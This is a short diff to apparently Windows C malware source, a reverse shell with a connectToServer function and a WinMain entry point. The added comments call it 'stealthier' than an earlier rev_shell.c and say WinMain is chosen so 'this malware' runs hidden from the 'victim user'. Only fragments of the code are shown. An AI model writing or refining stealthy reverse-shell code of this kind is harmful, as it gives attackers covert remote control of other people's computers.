@@ -3,6 +3,7 @@
 #include <ws2tcpip.h>
 #include <unistd.h>
 
+// Stealthier and more optimized than rev_shell.c
 
 int connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* server_ip) {
     inet_pton(AF_INET, server_ip, &serv_addr->sin_addr);
@@ -13,6 +14,10 @@ int connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const c
     }
 }
 
+/* 
+We use int CALLBACK WinMain() instead of int main() so that this malware will just 
+run in the background without showing the victim user anything.
+*/ 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
     
     char cmd_buff[1024];
